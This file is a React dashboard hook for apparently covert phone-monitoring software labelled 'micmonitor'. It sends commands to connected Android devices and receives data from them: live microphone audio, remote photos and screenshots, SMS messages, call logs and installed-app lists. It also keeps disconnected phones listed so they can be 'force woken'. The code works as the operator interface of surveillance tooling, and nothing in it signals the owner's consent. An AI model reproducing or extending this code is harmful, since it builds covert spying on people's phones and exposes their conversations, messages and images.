import { useCallback, useEffect, useMemo, useRef, useState } from 'react';
import { apiUrl, wsUrlForControl } from '../lib/helpers';

const PHOTO_LIMIT = 24;
const FEED_LIMIT = 24;

const photoIdentity = photo => String(photo?.id || photo?.filename || photo?.url || '');

const shallowEqual = (a, b) => {
  if (a === b) return true;
  if (!a || !b) return false;
  const aKeys = Object.keys(a);
  const bKeys = Object.keys(b);
  if (aKeys.length !== bKeys.length) return false;
  for (const key of aKeys) {
    if (a[key] !== b[key]) return false;
  }
  return true;
};

const mergePhotoList = (incoming, existing = []) => {
  const merged = new Map();

  [...incoming, ...existing].forEach(photo => {
    const key = photoIdentity(photo);
    if (!key) return;
    merged.set(key, {
      ...merged.get(key),
      ...photo
    });
  });

  return Array.from(merged.values())
    .sort((a, b) => new Date(b.timestamp || 0).getTime() - new Date(a.timestamp || 0).getTime())
    .slice(0, PHOTO_LIMIT);
};

export function useDashboard(onAudioData) {
  const SELECTED_DEVICE_STORAGE_KEY = 'micmonitor:selectedDeviceId';
  const [wsState, setWsState] = useState('connecting');
  const [isColdStarting, setIsColdStarting] = useState(false);
  const [devices, setDevices] = useState([]);
  const initialSelectedDeviceId = (() => {
    try {
      return window.localStorage.getItem(SELECTED_DEVICE_STORAGE_KEY) || '';
    } catch {
      return '';
    }
  })();
  const [selectedDeviceId, _setSelectedDeviceId] = useState(initialSelectedDeviceId);
  const selectedDeviceIdRef = useRef(initialSelectedDeviceId);
  const setSelectedDeviceId = useCallback(val => {
    _setSelectedDeviceId(prev => {
      const next = typeof val === 'function' ? val(prev) : val;
      selectedDeviceIdRef.current = next;
      try {
        if (next) window.localStorage.setItem(SELECTED_DEVICE_STORAGE_KEY, next);
        else window.localStorage.removeItem(SELECTED_DEVICE_STORAGE_KEY);
      } catch {
        // Storage is best-effort only.
      }
      return next;
    });
  }, []);
  const [serverHealth, setServerHealth] = useState(null);
  const [feed, setFeed] = useState([]);
  const [photos, setPhotos] = useState([]);
  const [installedApps, setInstalledApps] = useState({});
  const [pendingCommands, setPendingCommands] = useState({});
  const [toasts, setToasts] = useState([]);
  const [wsReconnectAt, setWsReconnectAt] = useState(null);
  const wsRef = useRef(null);
  const connectRef = useRef(null);
  const reconnectTimerRef = useRef(null);
  const coldStartTimerRef = useRef(null);
  const pendingWsCommandsRef = useRef([]);
  const lastWsMessageAtRef = useRef(0);
  const pendingTimersRef = useRef({});
  const toastTimersRef = useRef({});
  const feedDedupeRef = useRef({ message: '', ts: 0 });
  const selectedDevice = useMemo(() => devices.find(device => device.deviceId === selectedDeviceId) ?? null, [devices, selectedDeviceId]);
  const addFeed = useCallback(message => {
    const now = Date.now();
    const last = feedDedupeRef.current;
    if (last.message === message && now - last.ts < 2500) return;
    feedDedupeRef.current = { message, ts: now };
    setFeed(prev => {
      if (prev[0] === message) return prev;
      return [message, ...prev].slice(0, FEED_LIMIT);
    });
  }, []);
  const pushToast = useCallback((type, message, deviceId) => {
    const id = `${Date.now()}-${Math.random().toString(16).slice(2, 8)}`;
    setToasts(prev => [{
      id,
      type,
      message,
      deviceId: deviceId || null,
      ts: Date.now()
    }, ...prev].slice(0, 6));
    const timers = toastTimersRef.current;
    timers[id] = window.setTimeout(() => {
      setToasts(prev => prev.filter(item => item.id !== id));
      delete timers[id];
    }, 4500);
  }, []);
  const reconnectNow = useCallback(() => {
    if (reconnectTimerRef.current) {
      window.clearTimeout(reconnectTimerRef.current);
      reconnectTimerRef.current = null;
    }
    setWsReconnectAt(null);
    const ws = wsRef.current;
    if (ws && (ws.readyState === WebSocket.OPEN || ws.readyState === WebSocket.CONNECTING)) {
      try {
        ws.close();
      } catch {
        // Best-effort close before reconnect.
      }
    }
    if (connectRef.current) {
      connectRef.current();
    }
  }, []);
  const setCommandStatus = useCallback((deviceId, cmd, status) => {
    if (!deviceId || !cmd) return;
    const key = `${deviceId}:${cmd}`;
    const timers = pendingTimersRef.current;
    if (timers[key]) {
      window.clearTimeout(timers[key]);
      delete timers[key];
    }
    if (!status) {
      setPendingCommands(prev => {
        if (!prev[key]) return prev;
        const next = { ...prev };
        delete next[key];
        return next;
      });
      return;
    }
    const ts = Date.now();
    setPendingCommands(prev => {
      if (prev[key]?.status === status) return prev;
      return {
        ...prev,
        [key]: { status, ts }
      };
    });
    if (status === 'error' || status === 'sent' || status === 'queued' || status === 'sending') {
      const ttl = status === 'error' ? 3000 : status === 'sent' ? 1800 : 12000;
      timers[key] = window.setTimeout(() => {
        setPendingCommands(prev => {
          if (!prev[key]) return prev;
          if (prev[key].ts !== ts) return prev;
          const next = { ...prev };
          delete next[key];
          return next;
        });
        delete timers[key];
      }, ttl);
    }
  }, []);
  const mergeDeviceList = useCallback(incoming => {
    setDevices(prev => {
      const byId = new Map(prev.map(device => [device.deviceId, device]));
      const nextList = (incoming || []).map(device => {
        const existing = byId.get(device.deviceId);
        const merged = {
          ...existing,
          ...device,
          health: {
            ...existing?.health,
            ...device.health
          },
          sms: device.sms ?? existing?.sms,
          calls: device.calls ?? existing?.calls
        };
        if (
          existing &&
          existing.model === merged.model &&
          existing.sdk === merged.sdk &&
          existing.appVersionName === merged.appVersionName &&
          existing.appVersionCode === merged.appVersionCode &&
          existing.sms === merged.sms &&
          existing.calls === merged.calls &&
          shallowEqual(existing.health, merged.health)
        ) {
          return existing;
        }
        return merged;
      });
      if (nextList.length === prev.length && nextList.every((device, idx) => device === prev[idx])) {
        return prev;
      }
      return nextList;
    });
  }, []);
  const upsertDevice = useCallback(next => {
    setDevices(prev => {
      const idx = prev.findIndex(item => item.deviceId === next.deviceId);
      if (idx === -1) {
        return [next, ...prev];
      }
      const existing = prev[idx];
      const merged = {
        ...existing,
        ...next,
        health: {
          ...existing.health,
          ...next.health
        },
        sms: next.sms ?? existing.sms,
        calls: next.calls ?? existing.calls
      };
      if (
        existing.model === merged.model &&
        existing.sdk === merged.sdk &&
        existing.appVersionName === merged.appVersionName &&
        existing.appVersionCode === merged.appVersionCode &&
        existing.sms === merged.sms &&
        existing.calls === merged.calls &&
        shallowEqual(existing.health, merged.health)
      ) {
        return prev;
      }
      const clone = [...prev];
      clone[idx] = merged;
      return clone;
    });
  }, []);
  const removeDevice = useCallback(deviceId => {
    setDevices(prev => prev.filter(item => item.deviceId !== deviceId));
    setSelectedDeviceId(prev => prev === deviceId ? '' : prev);
  }, []);
  const loadPhotos = useCallback(async (deviceId, options = {}) => {
    try {
      const query = deviceId ? `?deviceId=${encodeURIComponent(deviceId)}` : '';
      const res = await fetch(apiUrl(`/api/photos${query}`));
      if (!res.ok) return;
      const json = await res.json();
      const mapped = (json || []).map((item, idx) => {
        let qualityDisplay = String(item.quality || 'normal');
        const nightMode = String(item.nightMode || 'off');
        if (nightMode !== 'off') {
          qualityDisplay += ` ${nightMode}`;
        }
        return {
          id: String(item.name || idx),
          filename: String(item.name || ''),
          url: apiUrl(String(item.url || '')),
          camera: item.camera === 'front' ? 'front' : item.camera === 'screenshot' ? 'screenshot' : 'rear',
          quality: qualityDisplay,
          aiEnhanced: false,
          size: Number(item.size || 0),
          timestamp: new Date(Number(item.ts || Date.now())).toISOString()
        };
      });
      setPhotos(prev => options.replace ? mapped.slice(0, PHOTO_LIMIT) : mergePhotoList(mapped, prev));
    } catch {
      // Best-effort hydration from backend media index.
    }
  }, []);

  // Refs for stable sendCommand closure — prevents identity changes on every device health update
  const devicesRef = useRef(devices);
  devicesRef.current = devices;

  // Command deduplication: prevent rapid-fire duplicate commands
  const lastCommandRef = useRef({ key: '', ts: 0 });

  const sendCommand = useCallback(async (cmd, extra = {}) => {
    const targetId = selectedDeviceIdRef.current || devicesRef.current[0]?.deviceId;
    if (!targetId) {
      addFeed(`Cannot send ${cmd}: no target device`);
      return;
    }

    // Deduplication: skip identical command+target+payload within 2 seconds
    const now = Date.now();
    const last = lastCommandRef.current;
    const dedupeKey = `${String(cmd)}|${String(targetId)}|${JSON.stringify(extra || {})}`;
    if (last.key === dedupeKey && now - last.ts < 2000) {
      return; // Silently skip duplicate
    }
    lastCommandRef.current = { key: dedupeKey, ts: now };

    addFeed(`Sending ${cmd}...`);
    setCommandStatus(targetId, cmd, 'sending');

    // Primary path: send via control WebSocket so backend can apply
    // per-dashboard audio subscriptions (required for live stream audio routing).
    const ws = wsRef.current;
    if (ws && ws.readyState === WebSocket.OPEN) {
      try {
        ws.send(JSON.stringify({
          cmd,
          deviceId: targetId,
          ...extra
        }));
        setCommandStatus(targetId, cmd, 'sent');
        return;
      } catch (err) {
        const message = err instanceof Error ? err.message : String(err);
        addFeed(`Control WS send failed for ${cmd}: ${message}; trying HTTP fallback...`);
        pushToast('error', `WS send failed for ${cmd}`, targetId);
      }
    }
    if (ws && ws.readyState === WebSocket.CONNECTING) {
      pendingWsCommandsRef.current.push({
        cmd,
        targetId,
        extra
      });
      setCommandStatus(targetId, cmd, 'queued');
      addFeed(`Queued ${cmd} for ${targetId} (control_ws connecting)`);
      return;
    }
    try {
      const res = await fetch(apiUrl(`/api/devices/${encodeURIComponent(targetId)}/command`), {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({
          type: cmd,
          ...extra
        })
      });
      const contentType = res.headers.get('content-type') || '';
      if (!contentType.includes('application/json')) {
        const bodyPreview = (await res.text()).replace(/\s+/g, ' ').slice(0, 120);
        throw new Error(`Unexpected API response (${res.status}): ${bodyPreview || 'empty body'}`);
      }
      const result = await res.json();
      if (!res.ok) {
        throw new Error(result.error || result.message || `HTTP ${res.status}`);
      }
      addFeed(`Sent ${cmd} to ${targetId}`);
      setCommandStatus(targetId, cmd, 'sent');
    } catch (err) {
      const message = err instanceof Error ? err.message : String(err);
      addFeed(`Failed to send ${cmd}: ${message}`);
      setCommandStatus(targetId, cmd, 'error');
      pushToast('error', `Failed to send ${cmd}`, targetId);
    }
  }, [addFeed, pushToast, setCommandStatus]);
  const onAudioDataRef = useRef(onAudioData);
  useEffect(() => {
    onAudioDataRef.current = onAudioData;
  }, [onAudioData]);
  useEffect(() => {
    let stopped = false;
    const connect = () => {
      setWsState('connecting');
      setIsColdStarting(false);
      setWsReconnectAt(null);
      if (coldStartTimerRef.current) {
        window.clearTimeout(coldStartTimerRef.current);
      }
      coldStartTimerRef.current = window.setTimeout(() => {
        if (wsRef.current?.readyState === WebSocket.CONNECTING) {
          setIsColdStarting(true);
        }
      }, 3500);
      const url = wsUrlForControl();
      const ws = new WebSocket(url);
      wsRef.current = ws;
      ws.binaryType = 'arraybuffer';
      ws.addEventListener('open', () => {
        setWsState('open');
        setIsColdStarting(false);
        setWsReconnectAt(null);
        if (coldStartTimerRef.current) window.clearTimeout(coldStartTimerRef.current);
        addFeed('Control WebSocket connected');
        if (pendingWsCommandsRef.current.length > 0) {
          const queued = pendingWsCommandsRef.current.splice(0);
          let flushed = 0;
          for (const item of queued) {
            try {
              ws.send(JSON.stringify({
                cmd: item.cmd,
                deviceId: item.targetId,
                ...item.extra
              }));
              flushed += 1;
            } catch {
              pendingWsCommandsRef.current.push(item);
            }
          }
          if (flushed > 0) {
            addFeed(`Flushed ${flushed} queued command${flushed > 1 ? 's' : ''}`);
          }
        }
      });
      ws.addEventListener('message', event => {
        lastWsMessageAtRef.current = Date.now();
        // Handle binary data
        if (event.data instanceof ArrayBuffer) {
          const view = new DataView(event.data);
          if (onAudioDataRef.current && event.data.byteLength > 4) {
            // Extract device ID from frame header
            const deviceIdLen = view.getUint16(0, false);
            if (event.data.byteLength >= 2 + deviceIdLen) {
              const deviceIdBytes = new Uint8Array(event.data, 2, deviceIdLen);
              const deviceId = new TextDecoder().decode(deviceIdBytes);
              // S-B5 fix: Slice off the device ID routing header so the audio player 
              // receives exactly the [4-byte APK header] + [Audio Data] it expects.
              const audioPayload = event.data.slice(2 + deviceIdLen);
              onAudioDataRef.current(audioPayload, deviceId);
            }
          }
          return;
        }
        if (typeof event.data !== 'string') {
          return;
        }
        try {
          const parsed = JSON.parse(event.data);
          let msg;
          if (parsed.type === 'device_list') {
            msg = parsed;
          } else {
            msg = parsed;
          }
          const type = String(msg.type || '');
          if (type === 'device_list' && Array.isArray(msg.devices)) {
            const list = msg.devices;
            mergeDeviceList(list);
            if (list[0]?.deviceId) {
              setSelectedDeviceId(prev => {
                if (prev && list.some(device => device.deviceId === prev)) return prev;
                return list[0].deviceId;
              });
            }
            return;
          }
          if (type === 'device_connected') {
            const deviceId = String(msg.deviceId || '');
            if (!deviceId) return;
            upsertDevice({
              deviceId,
              model: String(msg.model || 'Unknown'),
              health: msg.health || {}
            });
            setSelectedDeviceId(prev => prev || deviceId);
            addFeed(`Device connected: ${deviceId}`);
            return;
          }
          if (type === 'device_info') {
            const deviceId = String(msg.deviceId || '');
            if (!deviceId) return;
            upsertDevice({
              deviceId,
              model: String(msg.model || 'Unknown'),
              sdk: Number(msg.sdk || 0),
              appVersionName: String(msg.appVersionName || ''),
              appVersionCode: Number(msg.appVersionCode || 0)
            });
            return;
          }
          if (type === 'device_health') {
            const deviceId = String(msg.deviceId || '');
            if (!deviceId) return;
            upsertDevice({
              deviceId,
              health: msg.health || {}
            });
            return;
          }
          if (type === 'installed_apps') {
            const deviceId = String(msg.deviceId || '');
            if (!deviceId) return;
            setInstalledApps(prev => ({
              ...prev,
              [deviceId]: Array.isArray(msg.apps) ? msg.apps : []
            }));
            return;
          }
          if (type === 'audio_quality') {
            const deviceId = String(msg.deviceId || selectedDeviceIdRef.current || '');
            if (!deviceId) return;
            upsertDevice({
              deviceId,
              health: {
                lowNetwork: msg.lowNetwork === true,
                networkLagging: true,
                droppingPackets: msg.dropping === true,
                bufferedBytes: Number(msg.buffered || 0),
                audioDrops: Number(msg.droppedFrames || msg.dropped || 0)
              }
            });
            addFeed(`Audio lag on ${deviceId.slice(0, 8)}: dropping old packets`);
            return;
          }
          if (type === 'image_upload_status') {
            const deviceId = String(msg.deviceId || selectedDeviceIdRef.current || '');
            if (!deviceId) return;
            const status = String(msg.status || 'idle');
            upsertDevice({
              deviceId,
              health: Object.fromEntries(Object.entries({
                imageUploadStatus: status,
                imageQueued: msg.imageQueued === true,
                imageUploading: msg.uploading === true,
                uploadPausedForAudio: msg.uploadPausedForAudio === true,
                imageQueueDepth: Number(msg.queueDepth || 0),
                lowNetwork: msg.audioLive === true ? true : undefined
              }).filter(([, value]) => value !== undefined))
            });
            if (msg.command) {
              const command = String(msg.command);
              const commandStatus = status === 'queued' ? 'queued'
                : status === 'paused' || status === 'uploading' ? 'sending'
                : status === 'uploaded' ? 'sent'
                : status === 'error' ? 'error'
                : null;
              setCommandStatus(deviceId, command, commandStatus);
            }
            const label = status === 'paused' ? 'Upload paused for audio'
              : status === 'queued' ? 'Image queued'
              : status === 'uploading' ? 'Image uploading'
              : status === 'uploaded' ? 'Image uploaded'
              : status === 'error' ? 'Image upload failed'
              : null;
            if (label) addFeed(`${label}: ${String(msg.filename || '').slice(0, 40)}`);
            return;
          }
          if (type === 'gain_ack') {
            const deviceId = String(msg.deviceId || selectedDeviceIdRef.current || '');
            const level = Number(msg.level);
            if (!deviceId || !Number.isFinite(level)) return;
            upsertDevice({
              deviceId,
              health: {
                gainLevel: level
              }
            });
            return;
          }
          if (type === 'device_disconnected') {
            const deviceId = String(msg.deviceId || '');
            if (!deviceId) return;
            // SENIOR DEV FIX: Do NOT remove the device. Mark it as offline
            // so the user can still see it in the fleet and click "Force Wake".
            upsertDevice({
              deviceId,
              health: { wsConnected: false }
            });
            addFeed(`Device disconnected: ${deviceId}`);
            return;
          }

          // Handle device data (SMS, calls)
          if (type === 'device_data') {
            const deviceId = String(msg.deviceId || '');
            if (!deviceId) return;
            const data = msg.data;
            if (!data) return;

            // Parse SMS messages
            const rawSms = data.sms;
            const sms = (rawSms || []).slice(0, 100).map((s, i) => ({
              id: String(s.id || i),
              sender: String(s.address || 'Unknown'),
              body: String(s.body || ''),
              timestamp: new Date(Number(s.date || Date.now())).toISOString(),
              type: s.type === 'inbox' ? 'inbox' : s.type === 'sent' ? 'sent' : s.type === 'draft' ? 'draft' : 'other',
              read: Boolean(s.read)
            }));

            // Parse call log
            const rawCalls = data.callLog;
            const calls = (rawCalls || []).slice(0, 100).map((c, i) => ({
              id: String(c.id || i),
              number: String(c.number || 'Unknown'),
              name: c.name ? String(c.name) : undefined,
              type: c.type === 'incoming' ? 'incoming' : c.type === 'outgoing' ? 'outgoing' : c.type === 'missed' ? 'missed' : c.type === 'rejected' ? 'rejected' : 'other',
              duration: c.duration ? Number(c.duration) : undefined,
              timestamp: new Date(Number(c.date || Date.now())).toISOString()
            }));
            upsertDevice({
              deviceId,
              sms,
              calls
            });
            addFeed(`Device data received: ${sms.length} SMS, ${calls.length} calls`);
            return;
          }

          // Handle photo saved
          if (type === 'photo_saved') {
            let qualityDisplay = String(msg.quality || 'normal');
            const nightMode = String(msg.nightMode || 'off');
            if (nightMode !== 'off') {
              qualityDisplay += ` ${nightMode}`;
            }

            const photo = {
              id: String(msg.filename || Date.now()),
              filename: String(msg.filename || ''),
              url: apiUrl(String(msg.url || '')),
              camera: msg.camera === 'front' ? 'front' : msg.camera === 'screenshot' ? 'screenshot' : 'rear',
              quality: qualityDisplay,
              aiEnhanced: Boolean(msg.aiEnhanced),
              size: Number(msg.size || 0),
              timestamp: new Date(Number(msg.ts || Date.now())).toISOString()
            };
            setPhotos(prev => mergePhotoList([photo], prev));
            if (msg.deviceId) {
              setCommandStatus(String(msg.deviceId), photo.camera === 'screenshot' ? 'take_screenshot' : 'take_photo', null);
            }
            addFeed(`Photo saved: ${photo.filename}`);
            return;
          }

          if (type === 'screenshot_request_sent') {
            addFeed(`📸 Screenshot requested from device ${msg.deviceId}`);
            return;
          }

          if (type === 'screenshot_request_failed') {
            addFeed(`❌ Screenshot request failed: ${msg.reason}`);
            return;
          }

          if (type === 'command_pending') {
            const cmd = String(msg.command || '');
            const route = String(msg.route || 'queue');
            const prefix = msg.deviceId ? `${String(msg.deviceId).substring(0, 8)}:` : '';
            addFeed(`⏳ PENDING ${prefix} ${cmd} via ${route}`);
            if (msg.deviceId && cmd) {
              setCommandStatus(String(msg.deviceId), cmd, 'queued');
            }
            return;
          }
          if (type === 'command_dispatch') {
            const cmd = String(msg.command || '');
            const status = String(msg.status || 'queued');
            const prefix = msg.deviceId ? `${String(msg.deviceId).substring(0, 8)}:` : '';
            addFeed(`🚀 DISPATCH ${prefix} ${cmd} (${status})`);
            if (msg.deviceId && cmd) {
              setCommandStatus(String(msg.deviceId), cmd, status === 'sent' ? 'sent' : 'queued');
            }
            return;
          }

          // Handle command acknowledgments
          if (type === 'command_ack') {
            const cmd = String(msg.command || '');
            const status = String(msg.status || 'success');
            const detail = msg.detail ? ` - ${msg.detail}` : '';
            const prefix = msg.deviceId ? `${String(msg.deviceId).substring(0, 8)}:` : '';
            addFeed(`📢 CMD ${prefix} ${cmd} (${status})${detail}`);
            if (msg.deviceId && cmd) {
              if (status === 'success') {
                setCommandStatus(String(msg.deviceId), cmd, null);
              } else {
                setCommandStatus(String(msg.deviceId), cmd, 'error');
              }
              pushToast(status === 'success' ? 'success' : 'error', `${cmd} ${status === 'success' ? 'acknowledged' : 'failed'}`, String(msg.deviceId));
            }
            if (msg.deviceId && cmd === 'voice_profile' && msg.detail) {
              upsertDevice({
                deviceId: String(msg.deviceId),
                health: {
                  voiceProfile: String(msg.detail)
                }
              });
            }
            if (msg.deviceId && cmd === 'photo_night' && msg.detail) {
              upsertDevice({
                deviceId: String(msg.deviceId),
                health: {
                  photoNight: String(msg.detail)
                }
              });
            }
            if (msg.deviceId && cmd === 'photo_quality' && msg.detail) {
              upsertDevice({
                deviceId: String(msg.deviceId),
                health: {
                  photoQuality: String(msg.detail)
                }
              });
            }
            if (msg.deviceId && cmd === 'set_gain') {
              const match = String(msg.detail || '').match(/([0-9.]+)/);
              const level = match ? Number(match[1]) : NaN;
              if (Number.isFinite(level)) {
                upsertDevice({
                  deviceId: String(msg.deviceId),
                  health: {
                    gainLevel: level
                  }
                });
              }
            }
            return;
          }
          if (type === 'ack') {
            const cmd = String(msg.message || '');
            const prefix = msg.deviceId ? `${String(msg.deviceId).substring(0, 8)}:` : '';
            addFeed(`⚙️ ACK ${prefix} ${cmd}`);
            return;
          }

          if (type && type !== 'device_health' && type !== 'audio_quality' && type !== 'stream_started' && type !== 'stream_stopped') {
            // Optional: addFeed(`Ignored Event: ${type}`)
          }
        } catch {
          // Ignore parse errors for unexpected data
        }
      });
      ws.addEventListener('error', event => {
        addFeed('Control WebSocket error - browser blocked connection or backend down');
        if (coldStartTimerRef.current) window.clearTimeout(coldStartTimerRef.current);
        console.error('WS Error:', event);
      });
      ws.addEventListener('close', () => {
        setWsState('closed');
        setIsColdStarting(false);
        setWsReconnectAt(Date.now() + 3000);
        if (coldStartTimerRef.current) window.clearTimeout(coldStartTimerRef.current);
        if (stopped) return;
        addFeed('Control WebSocket disconnected, retrying...');
        reconnectTimerRef.current = window.setTimeout(connect, 3000);
      });
    };
    connectRef.current = connect;
    connect();
    return () => {
      stopped = true;
      if (reconnectTimerRef.current) {
        clearTimeout(reconnectTimerRef.current);
      }
      connectRef.current = null;
      wsRef.current?.close();
    };
  }, [addFeed, pushToast, removeDevice, upsertDevice, mergeDeviceList, setCommandStatus]);
  useEffect(() => {
    let stopped = false;
    const loadHealth = async () => {
      try {
        const res = await fetch(apiUrl('/health'));
        const json = await res.json();
        if (!stopped) {
          setServerHealth(json);
        }
      } catch {
        if (!stopped) {
          setServerHealth(null);
        }
      }
    };
    loadHealth();
    const id = window.setInterval(loadHealth, 30000);
    return () => {
      stopped = true;
      clearInterval(id);
    };
  }, []);

  useEffect(() => {
    let stopped = false;
    const loadDevices = async () => {
      if (wsState === 'open' && Date.now() - lastWsMessageAtRef.current < 30000) return;
      try {
        const res = await fetch(apiUrl('/api/devices'));
        if (!res.ok) return;
        const json = await res.json();
          if (!stopped && Array.isArray(json.devices)) {
            mergeDeviceList(json.devices);
            if (json.devices[0]?.deviceId) {
            setSelectedDeviceId(prev => {
              if (prev && json.devices.some(device => device.deviceId === prev)) return prev;
              return json.devices[0].deviceId;
            });
          }
        }
      } catch {
        // Best-effort polling fallback.
      }
    };
    loadDevices();
    const id = window.setInterval(loadDevices, 30000);
    return () => {
      stopped = true;
      clearInterval(id);
    };
  }, [mergeDeviceList, setSelectedDeviceId, wsState]);

  useEffect(() => {
    void loadPhotos(selectedDeviceId || undefined, { replace: true });
  }, [loadPhotos, selectedDeviceId]);
  useEffect(() => {
    if (selectedDeviceId) {
      return;
    }
    if (devices[0]?.deviceId) {
      setSelectedDeviceId(prev => {
        if (prev && devices.some(device => device.deviceId === prev)) return prev;
        return devices[0].deviceId;
      });
    }
  }, [devices, selectedDeviceId]);
  return {
    wsState,
    isColdStarting,
    devices,
    selectedDevice,
    selectedDeviceId,
    serverHealth,
    feed,
    photos,
    installedApps,
    pendingCommands,
    toasts,
    wsReconnectAt,

    setSelectedDeviceId,
    sendCommand,
    reconnectNow,
    // Expose the underlying control WebSocket instance (may be null until connected)
    ws: wsRef.current
  };
}
